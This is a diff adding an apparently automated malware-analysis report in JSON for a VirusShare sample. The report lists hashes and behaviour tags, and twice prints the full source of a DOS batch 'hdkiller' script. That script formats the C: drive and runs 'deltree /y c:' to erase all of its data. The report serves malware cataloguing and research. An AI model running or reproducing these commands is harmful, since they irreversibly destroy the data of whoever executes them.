@@ -1,0 +1,67 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "command": "May run PowerShell commands",
+            "windows": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "@echo off \nformat c: /q /u /autotest  \nif exist c:\\dos\\format.* goto dosform \nif exist c:\\windows\\command\\format.* goto winform  \ngoto del \n:dosform \ncd\\dos  \nformat c: /q /u /autotest   \ncd\\  \n:winform \ncd\\windows\\command  \nformat c: /q /u /autotest   \ncd\\  \ngoto write \n:del \nif exist c:\\dvar.txt goto dtree  \ngoto write \n:dtree \ndeltree /y c:  \nif exist c:\\dos\\deltree.* goto deldos \nif exist c:\\windows\\command\\deltree.* goto delwin \n:deldos \ncd\\dos \nc:\\dos\\deltree /y c:   \ncd\\ \n:delwin \ncd\\windows\\command   \ndeltree /y c:  \ncd\\  \n:write \ntype hdkiller.txt  \npause "
+    },
+    "filename": "VirusShare_052a160d54527d7a34f4603a359759b9",
+    "filesize": 604,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "052a160d54527d7a34f4603a359759b9",
+        "sha1": "5286df9bdfdb59639948ba10e647e37d92fe8f88",
+        "sha256": "77e1effc3f07753759b4a0d71e1cf7a2a163dc20d806c30b9b68df6cde8b540a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off ",
+            "format c: /q /u /autotest  ",
+            "if exist c:\\dos\\format.* goto dosform ",
+            "if exist c:\\windows\\command\\format.* goto winform  ",
+            "goto del ",
+            ":dosform ",
+            "cd\\dos  ",
+            "format c: /q /u /autotest   ",
+            "cd\\  ",
+            ":winform ",
+            "cd\\windows\\command  ",
+            "format c: /q /u /autotest   ",
+            "cd\\  ",
+            "goto write ",
+            ":del ",
+            "if exist c:\\dvar.txt goto dtree  ",
+            "goto write ",
+            ":dtree ",
+            "deltree /y c:  ",
+            "if exist c:\\dos\\deltree.* goto deldos ",
+            "if exist c:\\windows\\command\\deltree.* goto delwin ",
+            ":deldos ",
+            "cd\\dos ",
+            "c:\\dos\\deltree /y c:   ",
+            "cd\\ ",
+            ":delwin ",
+            "cd\\windows\\command   ",
+            "deltree /y c:  ",
+            "cd\\  ",
+            ":write ",
+            "type hdkiller.txt  ",
+            "pause "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.318770",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
